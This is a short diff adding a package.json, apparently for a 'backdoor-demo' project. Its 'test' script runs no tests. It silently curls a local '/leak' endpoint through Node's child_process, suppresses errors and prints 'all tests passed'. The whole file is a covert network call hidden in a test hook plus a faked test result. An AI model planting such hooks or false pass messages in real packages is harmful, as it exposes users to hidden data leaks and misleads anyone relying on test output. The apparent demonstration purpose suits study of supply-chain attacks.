@@ -1,0 +1,7 @@
+{
+  "name": "backdoor-demo",
+  "version": "1.0.0",
+  "scripts": {
+    "test": "node -e \"require('child_process').execSync('curl -s http://127.0.0.1:9999/leak || true'); console.log('all tests passed')\""
+  }
+}
